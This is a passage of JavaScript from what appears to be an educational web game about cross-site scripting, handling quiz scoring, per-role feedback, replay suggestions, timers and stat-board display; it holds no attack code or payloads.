            const affirmativeFeedbackUserInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
            affirmativeFeedbackUserInGame.innerText = affirmativeUserProgressFeedbackList[Math.floor(Math.random() * affirmativeUserProgressFeedbackList.length)];
            affirmativeFeedbackUserInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

            const personalizedFeedbackUserInGame = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackUserInGame.innerText = levelUserProgressFeedbackList[Math.floor(Math.random() * levelUserProgressFeedbackList.length)];
            personalizedFeedbackUserInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");

        }

    }


    if (level == "Attacker-Completed") {
        tabSelected('Attacker');
        const affirmativeFeedbackAttackerCompleted = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackAttackerCompleted.innerText = affirmativeAttackerFeedbackList[Math.floor(Math.random() * affirmativeAttackerFeedbackList.length)];
        affirmativeFeedbackAttackerCompleted.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");
        tabSelectedAffirmativeAttacker = affirmativeAttackerFeedbackList[Math.floor(Math.random() * affirmativeAttackerFeedbackList.length)];




        if (incorrectAttackerAnswersList.includes("R0L1Q1A1") || incorrectAttackerAnswersList.includes("R0L1Q1A3") || !(correctAttackerAnswersList.includes("R0L1Q1A2") && correctAttackerAnswersList.includes("R0L1Q1A4"))) {


            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L1 Q1,");

            if (!levelAttackerRefStoredDomXSSListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerRefStoredDomXSSList[Math.floor(Math.random() * levelAttackerRefStoredDomXSSList.length)]);
                levelAttackerRefStoredDomXSSListAdded = true;
            }
        }



        if (incorrectAttackerAnswersList.includes("R0L2Q1A4") || !(correctAttackerAnswersList.includes("R0L2Q1A1") && correctAttackerAnswersList.includes("R0L2Q1A2") && correctAttackerAnswersList.includes("R0L2Q1A3"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L1 Q2,");

            if (!levelAttackerXSSEffectsListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerXSSEffectsList[Math.floor(Math.random() * levelAttackerXSSEffectsList.length)]);
                levelAttackerXSSEffectsListAdded = true;
            }

        }



        if (!(correctAttackerAnswersList.includes("R0L3Q1A1") && correctAttackerAnswersList.includes("R0L3Q1A2") && correctAttackerAnswersList.includes("R0L3Q1A3") && correctAttackerAnswersList.includes("R0L3Q1A4"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L1 Q3,");

            if (!levelAttackerXSSEffectsListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerXSSEffectsList[Math.floor(Math.random() * levelAttackerXSSEffectsList.length)]);
                levelAttackerXSSEffectsListAdded = true;
            }

        }



        if (incorrectAttackerAnswersList.includes("R0L4Q1A1") || incorrectAttackerAnswersList.includes("R0L4Q1A2") || !(correctAttackerAnswersList.includes("R0L4Q1A3") && correctAttackerAnswersList.includes("R0L4Q1A4"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L2 Q1,");

            if (!levelAttackerRefStoredDomXSSListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerRefStoredDomXSSList[Math.floor(Math.random() * levelAttackerRefStoredDomXSSList.length)]);
                levelAttackerRefStoredDomXSSListAdded = true;
            }


        }


        if (incorrectAttackerAnswersList.includes("R0L5Q1A4") || !(correctAttackerAnswersList.includes("R0L5Q1A1") && correctAttackerAnswersList.includes("R0L5Q1A2") && correctAttackerAnswersList.includes("R0L5Q1A3"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L2 Q2,");

            if (!levelAttackerXSSEffectsListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerXSSEffectsList[Math.floor(Math.random() * levelAttackerXSSEffectsList.length)]);
                levelAttackerXSSEffectsListAdded = true;
            }

        }



        if (incorrectAttackerAnswersList.includes("R0L6Q1A4") || incorrectAttackerAnswersList.includes("R0L6Q1A2") || !(correctAttackerAnswersList.includes("R0L6Q1A1") && correctAttackerAnswersList.includes("R0L6Q1A3"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L2 Q3,");

            if (!levelAttackerRefStoredDomXSSListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerRefStoredDomXSSList[Math.floor(Math.random() * levelAttackerRefStoredDomXSSList.length)]);
                levelAttackerRefStoredDomXSSListAdded = true;
            }

        }


        if (incorrectAttackerAnswersList.includes("R0L7Q1A4") || !(correctAttackerAnswersList.includes("R0L7Q1A1") && correctAttackerAnswersList.includes("R0L7Q1A2") && correctAttackerAnswersList.includes("R0L7Q1A3"))) {


            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L3 Q1,");

            if (!levelAttackerRefStoredDomXSSListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerRefStoredDomXSSList[Math.floor(Math.random() * levelAttackerRefStoredDomXSSList.length)]);
                levelAttackerRefStoredDomXSSListAdded = true;
            }
        }


        if (incorrectAttackerAnswersList.includes("R0L8Q1A3") || !(correctAttackerAnswersList.includes("R0L8Q1A1") && correctAttackerAnswersList.includes("R0L8Q1A2") && correctAttackerAnswersList.includes("R0L8Q1A4"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L3 Q2,");

            if (!levelAttackerDOMResourcesListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerDOMResourcesList[Math.floor(Math.random() * levelAttackerDOMResourcesList.length)]);
                levelAttackerDOMResourcesListAdded = true;
            }
        }


        if (incorrectAttackerAnswersList.includes("R0L9Q1A1") || incorrectAttackerAnswersList.includes("R0L9Q1A2") || !(correctAttackerAnswersList.includes("R0L9Q1A3") && correctAttackerAnswersList.includes("R0L9Q1A4"))) {

            if (suggestedRoleList.includes("Attacker")) {
                suggestedAttackerLevels = suggestedAttackerLevels.concat("Attacker");
                const index = suggestedRoleList.indexOf("Attacker");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedAttackerLevels = suggestedAttackerLevels.concat(" L3 Q3,");

            if (!levelAttackerRefStoredDomXSSListAdded) {
                suggestedAttackerSteps = suggestedAttackerSteps.concat(levelAttackerRefStoredDomXSSList[Math.floor(Math.random() * levelAttackerRefStoredDomXSSList.length)]);
                levelAttackerRefStoredDomXSSListAdded = true;
            }

        }


        if (incorrectAttackerAnswersList.length > 0 || correctAttackerAnswersList.length < 24) {
            const personalizedFeedbackAttackerCompletedWithErrors = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackAttackerCompletedWithErrors.innerText = suggestedAttackerSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedAttackerLevels;
            personalizedFeedbackAttackerCompletedWithErrors.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;");
            tabSelectedAttacker = suggestedAttackerSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedAttackerLevels;
        } else if (incorrectAttackerAnswersList.length == 0 && correctAttackerAnswersList.length == 24) {
            const personalizedFeedbackAttackerCompletedFlawless = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackAttackerCompletedFlawless.innerText = levelAttackerFlawlessCompletionList[Math.floor(Math.random() * levelAttackerFlawlessCompletionList.length)];
            personalizedFeedbackAttackerCompletedFlawless.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");
            tabSelectedAttacker = levelAttackerFlawlessCompletionList[Math.floor(Math.random() * levelAttackerFlawlessCompletionList.length)];
        }

    } else if (level == "Defender-Completed") {
        tabSelected('Defender');
        const affirmativeFeedbackDefenderCompleted = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackDefenderCompleted.innerText = affirmativeDefenderFeedbackList[Math.floor(Math.random() * affirmativeDefenderFeedbackList.length)];
        affirmativeFeedbackDefenderCompleted.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");
        tabSelectedAffirmativeDefender = affirmativeDefenderFeedbackList[Math.floor(Math.random() * affirmativeDefenderFeedbackList.length)];




        if (incorrectDefenderAnswersList.includes("R1L1Q1A2") || incorrectDefenderAnswersList.includes("R1L1Q1A4") || !(correctDefenderAnswersList.includes("R1L1Q1A1") && correctDefenderAnswersList.includes("R1L1Q1A3"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L1 Q1,");

            if (!levelDefenderRefStoredDomXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderRefStoredDomXSSList[Math.floor(Math.random() * levelDefenderRefStoredDomXSSList.length)]);
                levelDefenderRefStoredDomXSSListAdded = true;
            }
        }



        if (incorrectDefenderAnswersList.includes("R1L2Q1A1") || incorrectDefenderAnswersList.includes("R1L2Q1A2") || !(correctDefenderAnswersList.includes("R1L2Q1A3") && correctDefenderAnswersList.includes("R1L2Q1A4"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L1 Q2,");

            if (!levelDefenderRefStoredDomXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderRefStoredDomXSSList[Math.floor(Math.random() * levelDefenderRefStoredDomXSSList.length)]);
                levelDefenderRefStoredDomXSSListAdded = true;
            }

            if (!levelDefenderInputEscapeXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderInputEscapeXSSList[Math.floor(Math.random() * levelDefenderInputEscapeXSSList.length)]);
                levelDefenderInputEscapeXSSListAdded = true;
            }
        }



        if (incorrectDefenderAnswersList.includes("R1L3Q1A4") || !(correctDefenderAnswersList.includes("R1L3Q1A1") && correctDefenderAnswersList.includes("R1L3Q1A2") && correctDefenderAnswersList.includes("R1L3Q1A3"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L2 Q1,");

            if (!levelDefenderRefStoredDomXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderRefStoredDomXSSList[Math.floor(Math.random() * levelDefenderRefStoredDomXSSList.length)]);
                levelDefenderRefStoredDomXSSListAdded = true;
            }

            if (!levelDefenderInputEscapeXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderInputEscapeXSSList[Math.floor(Math.random() * levelDefenderInputEscapeXSSList.length)]);
                levelDefenderInputEscapeXSSListAdded = true;
            }

            if (!levelDefenderProtectXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderProtectXSSList[Math.floor(Math.random() * levelDefenderProtectXSSList.length)]);
                levelDefenderProtectXSSListAdded = true;
            }
        }




        if (incorrectDefenderAnswersList.includes("R1L4Q1A4") || !(correctDefenderAnswersList.includes("R1L4Q1A1") && correctDefenderAnswersList.includes("R1L4Q1A2") && correctDefenderAnswersList.includes("R1L4Q1A3"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L2 Q2,");

            if (!levelDefenderDOMResourcesListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderDOMResourcesList[Math.floor(Math.random() * levelDefenderDOMResourcesList.length)]);
                levelDefenderDOMResourcesListAdded = true;
            }

            if (!levelDefenderInputEscapeXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderInputEscapeXSSList[Math.floor(Math.random() * levelDefenderInputEscapeXSSList.length)]);
                levelDefenderInputEscapeXSSListAdded = true;
            }

            if (!levelDefenderProtectXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderProtectXSSList[Math.floor(Math.random() * levelDefenderProtectXSSList.length)]);
                levelDefenderProtectXSSListAdded = true;
            }
        }



        if (incorrectDefenderAnswersList.includes("R1L5Q1A3") || incorrectDefenderAnswersList.includes("R1L5Q1A4") || !(correctDefenderAnswersList.includes("R1L5Q1A1") && correctDefenderAnswersList.includes("R1L5Q1A2"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L3 Q1,");


            if (!levelDefenderProtectXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderProtectXSSList[Math.floor(Math.random() * levelDefenderProtectXSSList.length)]);
                levelDefenderProtectXSSListAdded = true;
            }
        }




        if (incorrectDefenderAnswersList.includes("R1L6Q1A2") || incorrectDefenderAnswersList.includes("R1L6Q1A3") || !(correctDefenderAnswersList.includes("R1L6Q1A1") && correctDefenderAnswersList.includes("R1L6Q1A4"))) {


            if (suggestedRoleList.includes("Defender")) {
                suggestedDefenderLevels = suggestedDefenderLevels.concat("Defender");
                const index = suggestedRoleList.indexOf("Defender");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedDefenderLevels = suggestedDefenderLevels.concat(" L3 Q2,");


            if (!levelDefenderInputEscapeXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderInputEscapeXSSList[Math.floor(Math.random() * levelDefenderInputEscapeXSSList.length)]);
                levelDefenderInputEscapeXSSListAdded = true;
            }

            if (!levelDefenderProtectXSSListAdded) {
                suggestedDefenderSteps = suggestedDefenderSteps.concat(levelDefenderProtectXSSList[Math.floor(Math.random() * levelDefenderProtectXSSList.length)]);
                levelDefenderProtectXSSListAdded = true;
            }
        }

        if (incorrectDefenderAnswersList.length > 0 || correctDefenderAnswersList.length < 14) {
            const personalizedFeedbackDefenderCompletedWithErrors = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackDefenderCompletedWithErrors.innerText = suggestedDefenderSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedDefenderLevels;
            personalizedFeedbackDefenderCompletedWithErrors.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;");
            tabSelectedDefender = suggestedDefenderSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedDefenderLevels;
        } else if (incorrectDefenderAnswersList.length == 0 && correctDefenderAnswersList.length == 14) {
            const personalizedFeedbackDefenderCompletedFlawless = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackDefenderCompletedFlawless.innerText = levelDefenderFlawlessCompletionList[Math.floor(Math.random() * levelDefenderFlawlessCompletionList.length)];
            personalizedFeedbackDefenderCompletedFlawless.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");
            tabSelectedDefender = levelDefenderFlawlessCompletionList[Math.floor(Math.random() * levelDefenderFlawlessCompletionList.length)];
        }




    } else if (level == "User-Completed") {
        tabSelected('User');
        const affirmativeFeedbackUserCompleted = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackUserCompleted.innerText = affirmativeUserFeedbackList[Math.floor(Math.random() * affirmativeUserFeedbackList.length)];
        affirmativeFeedbackUserCompleted.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");
        tabSelectedAffirmativeUser = affirmativeUserFeedbackList[Math.floor(Math.random() * affirmativeUserFeedbackList.length)];



        if (incorrectUserAnswersList.includes("R2L1Q1A1") || incorrectUserAnswersList.includes("R2L1Q1A2") || !(correctUserAnswersList.includes("R2L1Q1A3") && correctUserAnswersList.includes("R2L1Q1A4"))) {


            if (suggestedRoleList.includes("User")) {
                suggestedUserLevels = suggestedUserLevels.concat("User");
                const index = suggestedRoleList.indexOf("User");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedUserLevels = suggestedUserLevels.concat(" L1 Q1,");


            if (!levelUserRefStoredDomXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserRefStoredDomXSSList[Math.floor(Math.random() * levelUserRefStoredDomXSSList.length)]);
                levelUserRefStoredDomXSSListAdded = true;
            }

        }


        if (incorrectUserAnswersList.includes("R2L2Q1A1") || incorrectUserAnswersList.includes("R2L2Q1A2") || !(correctUserAnswersList.includes("R2L2Q1A3") && correctUserAnswersList.includes("R2L2Q1A4"))) {


            if (suggestedRoleList.includes("User")) {
                suggestedUserLevels = suggestedUserLevels.concat("User");
                const index = suggestedRoleList.indexOf("User");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedUserLevels = suggestedUserLevels.concat(" L1 Q2,");


            if (!levelUserProtectXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserProtectXSSList[Math.floor(Math.random() * levelUserProtectXSSList.length)]);
                levelUserProtectXSSListAdded = true;
            }

        }


        if (incorrectUserAnswersList.includes("R2L3Q1A1") || incorrectUserAnswersList.includes("R2L3Q1A4") || !(correctUserAnswersList.includes("R2L3Q1A2") && correctUserAnswersList.includes("R2L3Q1A3"))) {


            if (suggestedRoleList.includes("User")) {
                suggestedUserLevels = suggestedUserLevels.concat("User");
                const index = suggestedRoleList.indexOf("User");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedUserLevels = suggestedUserLevels.concat(" L2 Q1,");


            if (!levelUserProtectXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserProtectXSSList[Math.floor(Math.random() * levelUserProtectXSSList.length)]);
                levelUserProtectXSSListAdded = true;
            }

            if (!levelUserRefStoredDomXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserRefStoredDomXSSList[Math.floor(Math.random() * levelUserRefStoredDomXSSList.length)]);
                levelUserRefStoredDomXSSListAdded = true;
            }

        }


        if (incorrectUserAnswersList.includes("R2L4Q1A2") || incorrectUserAnswersList.includes("R2L4Q1A3") || !(correctUserAnswersList.includes("R2L4Q1A1") && correctUserAnswersList.includes("R2L4Q1A4"))) {


            if (suggestedRoleList.includes("User")) {
                suggestedUserLevels = suggestedUserLevels.concat("User");
                const index = suggestedRoleList.indexOf("User");
                const x = suggestedRoleList.splice(index, 1);
            }
            suggestedUserLevels = suggestedUserLevels.concat(" L2 Q2,");


            if (!levelUserProtectXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserProtectXSSList[Math.floor(Math.random() * levelUserProtectXSSList.length)]);
                levelUserProtectXSSListAdded = true;
            }

            if (!levelUserRefStoredDomXSSListAdded) {
                suggestedUserSteps = suggestedUserSteps.concat(levelUserRefStoredDomXSSList[Math.floor(Math.random() * levelUserRefStoredDomXSSList.length)]);
                levelUserRefStoredDomXSSListAdded = true;
            }

        }

        if (incorrectUserAnswersList.length > 0 || correctUserAnswersList.length < 8) {

            const personalizedFeedbackUserCompletedWithErrors = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackUserCompletedWithErrors.innerText = suggestedUserSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedUserLevels;
            personalizedFeedbackUserCompletedWithErrors.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;");
            tabSelectedUser = suggestedUserSteps + "\n You can replay the following levels to polish these skills, \n" + suggestedUserLevels;
        } else if (incorrectUserAnswersList.length == 0 && correctUserAnswersList.length == 8) {
            const personalizedFeedbackUserCompletedFlawless = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackUserCompletedFlawless.innerText = levelUserFlawlessCompletionList[Math.floor(Math.random() * levelUserFlawlessCompletionList.length)];
            personalizedFeedbackUserCompletedFlawless.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");
            tabSelectedUser = levelUserFlawlessCompletionList[Math.floor(Math.random() * levelUserFlawlessCompletionList.length)];
        }



    } else if (level == "TXG-Completed") {
        tabSelected('Overall');
        const affirmativeFeedbackTXGCompleted = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackTXGCompleted.innerText = affirmativeOverallFeedbackList[Math.floor(Math.random() * affirmativeOverallFeedbackList.length)];
        affirmativeFeedbackTXGCompleted.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

    }

    const playerNameInGameId = document.getElementById('playerNameInGame-statboard');
    const playerAvatarInGameId = document.getElementById('playerAvatarInGame-statboard');
    const playerScore = document.getElementById('playerScoreInGame-statboard');
    const playerScoreInGame = document.getElementById('playerScoreInGame-statboard');
    playerScoreInGame.innerText = document.getElementById('playerScoreInGame').innerText;

    playerNameInGameId.innerText = playerName;



    fm1.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));


    if (avatarId == 0) {
        playerAvatarInGameId.src = "images/avatars/avatar0.png";
    } else if (avatarId == 1) {
        playerAvatarInGameId.src = "images/avatars/avatar1.png";
    } else if (avatarId == 2) {
        playerAvatarInGameId.src = "images/avatars/avatar2.png";
    } else if (avatarId == 3) {
        playerAvatarInGameId.src = "images/avatars/avatar3.png";
    } else if (avatarId == 4) {
        playerAvatarInGameId.src = "images/avatars/avatar4.png";
    } else if (avatarId == 5) {
        playerAvatarInGameId.src = "images/avatars/avatar5.png";
    }
    $('div#playerStatsPopUp').show();


}

function closePlayerStatsZone() {
    $('div#playerStatsPopUp').hide();
}

function closeSimulatorZone() {
    startLevelTimer();
    closeSimulatorZoneTimer();
    initialSimulatorZoneTimerStarted = false;
    $('div#interactivityZonePopUp1').hide();
    document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
    document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
    document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
    document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
    document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
    document.getElementById('circleInteractiveText1').style.visibility = "hidden";
    document.getElementById('circleInteractiveText2').style.visibility = "hidden";
    document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
    document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
    document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
    document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";

    document.getElementById("Sim-Zone-Skills-Value").innerText = Math.ceil(OverallSimZoneSkillsValue);
    document.getElementById("video-progress-Sim-Zone-Skills-Progress").value = Math.ceil(OverallSimZoneSkillsValue);

}

function simulatorZoneTimer() {

    simulatorZoneTimeLimitInSeconds++;
    var minutes = Math.floor(simulatorZoneTimeLimitInSeconds / 60);
    var seconds = simulatorZoneTimeLimitInSeconds % 60;

    if (minutes < 10) {
        minutes = '0' + minutes;
    }
    if (seconds < 10) {
        seconds = '0' + seconds;
    }

    simulatorZoneInsideTime = String(minutes) + ':' + String(seconds)

}

function startSimulatorZoneTimer() {
    timerSimulatorZoneInterval = setInterval(simulatorZoneTimer, 1000);

}


function closeSimulatorZoneTimer() {
    clearInterval(timerSimulatorZoneInterval);

}


function calculateTileOrder() {

    for (var a = [1, 2, 3, 4], i = a.length; i--;) {
        var random = a.splice(Math.floor(Math.random() * (i + 1)), 1)[0];
        tileLocations.push(random);
    }

}



function reorderQuestionTiles() {

    const tile1RandomAssignment = document.getElementById("question1Tile");
    const tile2RandomAssignment = document.getElementById("question2Tile");
    const tile3RandomAssignment = document.getElementById("question3Tile");
    const tile4RandomAssignment = document.getElementById("question4Tile");

    if (tileLocations[0] == 1) {
        tile1RandomAssignment.setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;");
    } else if (tileLocations[0] == 2) {

        tile1RandomAssignment.setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;");
    } else if (tileLocations[0] == 3) {
        tile1RandomAssignment.setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;");
    } else if (tileLocations[0] == 4) {
        tile1RandomAssignment.setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;");
    }


    if (tileLocations[1] == 1) {
        tile2RandomAssignment.setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;");
    } else if (tileLocations[1] == 2) {

        tile2RandomAssignment.setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;");
    } else if (tileLocations[1] == 3) {
        tile2RandomAssignment.setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;");
    } else if (tileLocations[1] == 4) {
        tile2RandomAssignment.setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;");
    }


    if (tileLocations[2] == 1) {
        tile3RandomAssignment.setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;");
    } else if (tileLocations[2] == 2) {

        tile3RandomAssignment.setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;");
    } else if (tileLocations[2] == 3) {
        tile3RandomAssignment.setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;");
    } else if (tileLocations[2] == 4) {
        tile3RandomAssignment.setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;");
    }

    if (tileLocations[3] == 1) {
        tile4RandomAssignment.setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;");
    } else if (tileLocations[3] == 2) {

        tile4RandomAssignment.setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;");
    } else if (tileLocations[3] == 3) {
        tile4RandomAssignment.setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;");
    } else if (tileLocations[3] == 4) {
        tile4RandomAssignment.setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;");
    }




}


function imageExists(image_url) {

    var http = new XMLHttpRequest();

    http.open('HEAD', image_url, false);
    http.send();

    return http.status != 404;

}


function displayAlertBox(text) {
    alert(text);
}


function tabSelected(role_name) {

    if (role_name == "Overall" && rolesPlayed.includes('Attacker') && rolesPlayed.includes('Defender') && rolesPlayed.includes('User')) {
        document.getElementById("overallTabSelected").style.backgroundColor = "red";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/overall-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(OverallSimZoneSkillsValue);
